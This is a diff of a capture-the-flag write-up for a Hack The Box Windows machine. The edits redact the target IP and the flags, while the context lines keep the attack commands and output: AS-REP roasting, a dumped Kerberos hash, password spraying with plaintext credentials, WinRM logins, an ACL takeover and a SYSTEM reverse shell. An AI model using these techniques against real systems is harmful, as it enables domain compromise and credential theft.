@@ -11,8 +11,6 @@ htb_url: https://app.hackthebox.com/machines/Multimaster
 ---
 ## Overview
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-multimaster-infocard.png)
-
 Hold on to your seats, because this Insane Windows machine is a wild ride. TODO:Finish this writeup, there are more notes and stuff in the notes app if anything is missing...
 
 ## Useful Skills and Tools
@@ -24,14 +22,14 @@ Hold on to your seats, because this Insane Windows machine is a wild ride. TODO:
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `10.10.10.179`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the output with a filename of `<name>`.
+I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the output with a filename of `<name>`.
 
 At first my scan wouldn't go through until I added the `-Pn` flag to stop nmap from sending ICMP probes. After that it proceeded normally.
 
 ```text
-zweilos@kalimaa:~/htb/multimaster$ nmap -p- -sC -sV -oN multimaster.nmap 10.10.10.179 -Pn
+zweilos@kalimaa:~/htb/multimaster$ nmap -p- -sC -sV -oN multimaster.nmap <YOUR_IP> -Pn
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-19 12:17 EDT
-Nmap scan report for 10.10.10.179
+Nmap scan report for <YOUR_IP>
 Host is up (0.050s latency).
 Not shown: 65513 filtered ports
 PORT      STATE SERVICE       VERSION
@@ -124,12 +122,12 @@ Capturing the burp request to the `/api/get/Colleagues`
 
 ```text
 POST /api/getColleagues HTTP/1.1
-Host: 10.10.10.179
+Host: <YOUR_IP>
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
 Accept: application/json, text/plain, */*
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
-Referer: http://10.10.10.179/
+Referer: http://<YOUR_IP>/
 Content-Type: application/json;charset=utf-8
 Content-Length: 91
 Connection: close
@@ -159,7 +157,7 @@ Content-Length: 1821
 next attempted to enumerate the valid users who have active accounts on this machine through Kerberos.
 
 ```text
-zweilos@kalimaa:~/htb/multimaster$ python3 /home/zweilos/impacket/examples/GetNPUsers.py -outputfile multimaster.hash -format hashcat -usersfile /home/zweilos/htb/multimaster/users -no-pass -dc-ip 10.10.10.179 MEGACORP/egre55
+zweilos@kalimaa:~/htb/multimaster$ python3 /home/zweilos/impacket/examples/GetNPUsers.py -outputfile multimaster.hash -format hashcat -usersfile /home/zweilos/htb/multimaster/users -no-pass -dc-ip <YOUR_IP> MEGACORP/egre55
 Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
 
 [-] User sbauer doesn't have UF_DONT_REQUIRE_PREAUTH set
@@ -250,7 +248,7 @@ from enum4linux
 
 ```text
  =========================================== 
-|    Getting domain SID for 10.10.10.179    |
+|    Getting domain SID for <YOUR_IP>    |
  =========================================== 
 Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
 Domain Name: MEGACORP
@@ -287,7 +285,7 @@ if __name__ == "__main__":
     i = 1100
     SID = "0x0105000000000005150000001C00D1BCD181F1492BDFC236"
     #SID = raw_input ("Enter SID:")
-    URL = "http://10.10.10.179/api/getColleagues"
+    URL = "http://<YOUR_IP>/api/getColleagues"
     #URL = raw_input ("Enter URL:")
 
     print colored ("\ n \ t + ------------------------------------------ ---------------------------- + "," magenta ")
@@ -345,7 +343,7 @@ if __name__ == "__main__":
 ### Finding user creds
 
 ```text
-zweilos@kalimaa:~/htb/multimaster$ evil-winrm -u tushikikatomo -i 10.10.10.179 -p finance1
+zweilos@kalimaa:~/htb/multimaster$ evil-winrm -u tushikikatomo -i <YOUR_IP> -p finance1
 
 Evil-WinRM shell v2.3
 
@@ -358,7 +356,7 @@ Info: Establishing connection to remote endpoint
 
 ```text
 *Evil-WinRM* PS C:\Users\alcibiades\Desktop> cat user.txt
-6043eb65fb46ebf347fa4c1fe9584a2f
+****
 ```
 
 ## Path to Power \(Gaining Administrator Access\)
@@ -375,7 +373,6 @@ User Name              SID
 ====================== =============================================
 megacorp\tushikikatomo S-1-5-21-3167813660-1240564177-918740779-1110
 
-
 GROUP INFORMATION
 -----------------
 
@@ -391,7 +388,6 @@ NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandat
 NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
 Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
 
-
 PRIVILEGES INFORMATION
 ----------------------
 
@@ -400,7 +396,6 @@ Privilege Name                Description                    State
 SeMachineAccountPrivilege     Add workstations to domain     Enabled
 SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
-
 
 USER CLAIMS INFORMATION
 -----------------------
@@ -415,9 +410,7 @@ User folders on this box include:
 ```text
 *Evil-WinRM* PS C:\Users> ls
 
-
     Directory: C:\Users
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
@@ -651,7 +644,6 @@ User Name       SID
 =============== =============================================
 megacorp\cyork S-1-5-21-3167813660-1240564177-918740779-3110
 
-
 GROUP INFORMATION
 -----------------
 
@@ -669,7 +661,6 @@ MEGACORP\Developers                        Group            S-1-5-21-3167813660-
 NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
 Mandatory Label\High Mandatory Level       Label            S-1-16-12288
 
-
 PRIVILEGES INFORMATION
 ----------------------
 
@@ -684,7 +675,6 @@ SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
 SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
 SeTimeZonePrivilege           Change the time zone                Enabled
-
 
 USER CLAIMS INFORMATION
 -----------------------
@@ -724,18 +714,18 @@ MASTER7{ "info" : "MegaCorp API" }!application/json€…server=localhost;databa
 ### Moving laterally to user3 - `sbauer`
 
 ```text
-zweilos@kalimaa:~/htb/multimaster$ crackmapexec smb -u users -p passwords -d MEGACORP 10.10.10.179
-SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP) (signing:True) (SMBv1:True)
-SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\shayna:password1 STATUS_LOGON_FAILURE 
-SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\shayna:finance1 STATUS_LOGON_FAILURE 
-SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\shayna:banking1 STATUS_LOGON_FAILURE 
-SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\shayna:D3veL0pM3nT! STATUS_LOGON_FAILURE
+zweilos@kalimaa:~/htb/multimaster$ crackmapexec smb -u users -p passwords -d MEGACORP <YOUR_IP>
+SMB         <YOUR_IP>    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP) (signing:True) (SMBv1:True)
+SMB         <YOUR_IP>    445    MULTIMASTER      [-] MEGACORP\shayna:password1 STATUS_LOGON_FAILURE 
+SMB         <YOUR_IP>    445    MULTIMASTER      [-] MEGACORP\shayna:finance1 STATUS_LOGON_FAILURE 
+SMB         <YOUR_IP>    445    MULTIMASTER      [-] MEGACORP\shayna:banking1 STATUS_LOGON_FAILURE 
+SMB         <YOUR_IP>    445    MULTIMASTER      [-] MEGACORP\shayna:D3veL0pM3nT! STATUS_LOGON_FAILURE
 
 ...snipped...
-SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\sbauer:password1 STATUS_LOGON_FAILURE 
-SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\sbauer:finance1 STATUS_LOGON_FAILURE 
-SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\sbauer:banking1 STATUS_LOGON_FAILURE 
-SMB         10.10.10.179    445    MULTIMASTER      [+] MEGACORP\sbauer:D3veL0pM3nT!
+SMB         <YOUR_IP>    445    MULTIMASTER      [-] MEGACORP\sbauer:password1 STATUS_LOGON_FAILURE 
+SMB         <YOUR_IP>    445    MULTIMASTER      [-] MEGACORP\sbauer:finance1 STATUS_LOGON_FAILURE 
+SMB         <YOUR_IP>    445    MULTIMASTER      [-] MEGACORP\sbauer:banking1 STATUS_LOGON_FAILURE 
+SMB         <YOUR_IP>    445    MULTIMASTER      [+] MEGACORP\sbauer:D3veL0pM3nT!
 ```
 
 I found a password for yet again another user: this time `sbauer`. Accordeing to my searches with Bloodhoud earlier, `jorden` should be next, then `Administrator`. we will see if my projected path from this user was correct.
@@ -760,7 +750,7 @@ Set-ADAccountControl -DoesNotRequirePreAuth
 Then we can use Impacket's GETSPNUSers.py
 
 ```text
-zweilos@kalimaa:~/htb/multimaster$ evil-winrm -u sbauer -i 10.10.10.179 -p D3veL0pM3nT!
+zweilos@kalimaa:~/htb/multimaster$ evil-winrm -u sbauer -i <YOUR_IP> -p D3veL0pM3nT!
 
 Evil-WinRM shell v2.3
 
@@ -774,7 +764,6 @@ USER INFORMATION
 User Name       SID
 =============== =============================================
 megacorp\sbauer S-1-5-21-3167813660-1240564177-918740779-3102
-
 
 GROUP INFORMATION
 -----------------
@@ -792,7 +781,6 @@ MEGACORP\Developers                         Group            S-1-5-21-3167813660
 NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
 Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
 
-
 PRIVILEGES INFORMATION
 ----------------------
 
@@ -801,7 +789,6 @@ Privilege Name                Description                    State
 SeMachineAccountPrivilege     Add workstations to domain     Enabled
 SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
-
 
 USER CLAIMS INFORMATION
 -----------------------
@@ -816,69 +803,69 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 `*Evil-WinRM* PS C:\inetpub> Set-ADAccountControl -DoesNotRequirePreAuth $True jorden`
 
 ```text
-zweilos@kalimaa:~/.local/bin$ python3 GetNPUsers.py -format hashcat -usersfile /home/zweilos/htb/multimaster/users -debug -dc-ip 10.10.10.179 MEGACORP/sbauer:D3veL0pM3nT!
+zweilos@kalimaa:~/.local/bin$ python3 GetNPUsers.py -format hashcat -usersfile /home/zweilos/htb/multimaster/users -debug -dc-ip <YOUR_IP> MEGACORP/sbauer:D3veL0pM3nT!
 Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
 
 [+] Impacket Library Installation Path: /home/zweilos/.local/lib/python3.8/site-packages/impacket
-[+] Trying to connect to KDC at 10.10.10.179
+[+] Trying to connect to KDC at <YOUR_IP>
 [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
-[+] Trying to connect to KDC at 10.10.10.179
+[+] Trying to connect to KDC at <YOUR_IP>
 [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
-[+] Trying to connect to KDC at 10.10.10.179
+[+] Trying to connect to KDC at <YOUR_IP>
 [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
-[+] Trying to connect to KDC at 10.10.10.179
+[+] Trying to connect to KDC at <YOUR_IP>
 [-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
-[+] Trying to connect to KDC at 10.10.10.179
+[+] Trying to connect to KDC at <YOUR_IP>
 [-] User aldom doesn't have UF_DONT_REQUIRE_PREAUTH set
-[+] Trying to connect to KDC at 10.10.10.179
+[+] Trying to connect to KDC at <YOUR_IP>
 [-] User alice doesn't have UF_DONT_REQUIRE_PREAUTH set
-[+] Trying to connect to KDC at 10.10.10.179
+[+] Trying to connect to KDC at <YOUR_IP>
 [-] User alyx doesn't have UF_DONT_REQUIRE_PREAUTH set
-[+] Trying to connect to KDC at 10.10.10.179
+[+] Trying to connect to KDC at <YOUR_IP>
 [-] User andrew doesn't have UF_DONT_REQUIRE_PREAUTH set
-[+] Trying to connect to KDC at 10.10.10.179
+[+] Trying to connect to KDC at <YOUR_IP>
 [-] User ckane doesn't have UF_DONT_REQUIRE_PREAUTH set
-[+] Trying to connect to KDC at 10.10.10.179
+[+] Trying to connect to KDC at <YOUR_IP>
 [-] User cyork doesn't have UF_DONT_REQUIRE_PREAUTH set
-[+] Trying to connect to KDC at 10.10.10.179
+[+] Trying to connect to KDC at <YOUR_IP>
 [-] User dai doesn't have UF_DONT_REQUIRE_PREAUTH set
-[+] Trying to connect to KDC at 10.10.10.179
+[+] Trying to connect to KDC at <YOUR_IP>
 [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
-[+] Trying to connect to KDC at 10.10.10.179
+[+] Trying to connect to KDC at <YOUR_IP>
 [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
-[+] Trying to connect to KDC at 10.10.10.179
+[+] Trying to connect to KDC at <YOUR_IP>
 [-] User ilee doesn't have UF_DONT_REQUIRE_PREAUTH set
-[+] Trying to connect to KDC at 10.10.10.179
+[+] Trying to connect to KDC at <YOUR_IP>
 [-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
-[+] Trying to connect to KDC at 10.10.10.179
+[+] Trying to connect to KDC at <YOUR_IP>
 $krb5asrep$23$jorden@MEGACORP:1056ca13b19833bd5ae1152f9fe42b5c$112eb867bb4c8c06593c39d27e4ca1167692f7f061691c45cd1825291fd3ae9a7b8130e239d076b0f928fc42e7d683444cb8b3124d54711fbd72278e24cf75f5bd08351fc4b63e43ae9e5affac8b6b702eef582c720ed88855e6c9a6ac41ebe7b5b86fb4043f607a6d4a090022c471183e812d08501d49ae1d2f1c62d35816e95c98437d54e396a1b680b7836a6cad4c3af218d25187bd3ac4df45ffbc13359d7b952b7d841a89ac7a1c8c16ce5625dc03212af744371cb24c611c9ddf0da4c3de5740ea9cdaf09e113d23e9969d4107be3ecc2ceeed48f274f95e5d108ff504fe527ff86a71606d38f5
-[+] Trying to connect to KDC at 10.10.10.179
+[+] Trying to connect to KDC at <YOUR_IP>
 [-] User jsmmons doesn't have UF_DONT_REQUIRE_PREAUTH set
-[+] Trying to connect to KDC at 10.10.10.179
+[+] Trying to connect to KDC at <YOUR_IP>
 [-] User kpage doesn't have UF_DONT_REQUIRE_PREAUTH set
-[+] Trying to connect to KDC at 10.10.10.179
+[+] Trying to connect to KDC at <YOUR_IP>
 [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
-[+] Trying to connect to KDC at 10.10.10.179
+[+] Trying to connect to KDC at <YOUR_IP>
 [-] User lana doesn't have UF_DONT_REQUIRE_PREAUTH set
-[+] Trying to connect to KDC at 10.10.10.179
+[+] Trying to connect to KDC at <YOUR_IP>
 [-] User nbourne doesn't have UF_DONT_REQUIRE_PREAUTH set
-[+] Trying to connect to KDC at 10.10.10.179
+[+] Trying to connect to KDC at <YOUR_IP>
 [-] User okent doesn't have UF_DONT_REQUIRE_PREAUTH set
-[+] Trying to connect to KDC at 10.10.10.179
+[+] Trying to connect to KDC at <YOUR_IP>
 [-] User pmartin doesn't have UF_DONT_REQUIRE_PREAUTH set
-[+] Trying to connect to KDC at 10.10.10.179
+[+] Trying to connect to KDC at <YOUR_IP>
 [-] User rmartin doesn't have UF_DONT_REQUIRE_PREAUTH set
-[+] Trying to connect to KDC at 10.10.10.179
+[+] Trying to connect to KDC at <YOUR_IP>
 [-] User sbauer doesn't have UF_DONT_REQUIRE_PREAUTH set
-[+] Trying to connect to KDC at 10.10.10.179
+[+] Trying to connect to KDC at <YOUR_IP>
 [-] User svc-nas doesn't have UF_DONT_REQUIRE_PREAUTH set
-[+] Trying to connect to KDC at 10.10.10.179
+[+] Trying to connect to KDC at <YOUR_IP>
 [-] User svc-sql doesn't have UF_DONT_REQUIRE_PREAUTH set
-[+] Trying to connect to KDC at 10.10.10.179
+[+] Trying to connect to KDC at <YOUR_IP>
 [-] User tushikikatomo doesn't have UF_DONT_REQUIRE_PREAUTH set
-[+] Trying to connect to KDC at 10.10.10.179
+[+] Trying to connect to KDC at <YOUR_IP>
 [-] User zac doesn't have UF_DONT_REQUIRE_PREAUTH set
-[+] Trying to connect to KDC at 10.10.10.179
+[+] Trying to connect to KDC at <YOUR_IP>
 [-] User zpowers doesn't have UF_DONT_REQUIRE_PREAUTH set
 ```
 
@@ -928,7 +915,6 @@ User Name       SID
 =============== =============================================
 megacorp\jorden S-1-5-21-3167813660-1240564177-918740779-3110
 
-
 GROUP INFORMATION
 -----------------
 
@@ -946,7 +932,6 @@ MEGACORP\Developers                        Group            S-1-5-21-3167813660-
 NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
 Mandatory Label\High Mandatory Level       Label            S-1-16-12288
 
-
 PRIVILEGES INFORMATION
 ----------------------
 
@@ -961,7 +946,6 @@ SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
 SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
 SeTimeZonePrivilege           Change the time zone                Enabled
-
 
 USER CLAIMS INFORMATION
 -----------------------
@@ -989,9 +973,7 @@ At line:1 char:9
 *Evil-WinRM* PS C:\Users\jorden\Documents> cd c:\
 *Evil-WinRM* PS C:\> ls
 
-
     Directory: C:\
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
@@ -1002,7 +984,6 @@ d-r---         1/9/2020   1:18 PM                Program Files
 d-----         1/9/2020   1:18 PM                Program Files (x86)
 d-r---         1/9/2020   5:14 PM                Users
 d-----         1/9/2020   2:39 PM                Windows
-
 
 *Evil-WinRM* PS C:\> $folder = 'C:\Users\Administrator'
 *Evil-WinRM* PS C:\> $acl = Get-ACL $folder
@@ -1028,7 +1009,6 @@ Make sure not to have any spaces between words in your command!
 *Evil-WinRM* PS C:\> Set-Acl -Path $folder -AclObject $acl
 *Evil-WinRM* PS C:\> Get-Acl $folder | fl
 
-
 Path   : Microsoft.PowerShell.Core\FileSystem::C:\Users\Administrator
 Owner  : NT AUTHORITY\SYSTEM
 Group  : NT AUTHORITY\SYSTEM
@@ -1041,9 +1021,7 @@ Sddl   : O:SYG:SYD:PAI(A;OICI;FA;;;SY)(A;OICI;FA;;;BA)(A;OICI;FA;;;LA)(A;OICI;FA
 *Evil-WinRM* PS C:\> cd C:\Users\Administrator
 *Evil-WinRM* PS C:\Users\Administrator> ls
 
-
     Directory: C:\Users\Administrator
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
@@ -1060,21 +1038,17 @@ d-r---         1/9/2020   2:45 PM                Saved Games
 d-r---         1/9/2020   2:45 PM                Searches
 d-r---         1/9/2020   2:45 PM                Videos
 
-
 *Evil-WinRM* PS C:\Users\Administrator> cd Desktop
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
 
-
     Directory: C:\Users\Administrator\Desktop
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 -ar---        7/23/2020  10:08 PM             34 root.txt
 
-
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
-fe237d93abd456b96a363e2ed34fb271
+****
 ```
 
 ### Getting Administrator Shell
@@ -1176,7 +1150,7 @@ I had to try many services until I found one that would work. Even then, it said
 ```text
 zweilos@kalimaa:~/htb/multimaster$ nc -lvnp 12345
 listening on [any] 12345 ...
-connect to [10.10.15.57] from (UNKNOWN) [10.10.10.179] 49763
+connect to [10.10.15.57] from (UNKNOWN) [<YOUR_IP>] 49763
 Microsoft Windows [Version 10.0.14393]
 (c) 2016 Microsoft Corporation. All rights reserved.
 
@@ -1189,7 +1163,6 @@ USER INFORMATION
 User Name           SID     
 =================== ========
 nt authority\system S-1-5-18
-
 
 GROUP INFORMATION
 -----------------
@@ -1207,7 +1180,6 @@ NT AUTHORITY\This Organization             Well-known group S-1-5-15            
 NT SERVICE\VSS                             Well-known group S-1-5-80-3195062495-2862850656-3724129271-1847284719-4038691091 Enabled by default, Enabled group, Group owner    
 LOCAL                                      Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group
 BUILTIN\Administrators                     Alias            S-1-5-32-544                                                    Enabled by default, Enabled group, Group owner    
-
 
 PRIVILEGES INFORMATION
 ----------------------
@@ -1255,5 +1227,3 @@ limbernie
 ### Finale
 
 MinatoTW & egre55 Thanks to [`<box_creator>`](https://www.hackthebox.eu/home/users/profile/<profile_num>) for .
-
-If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
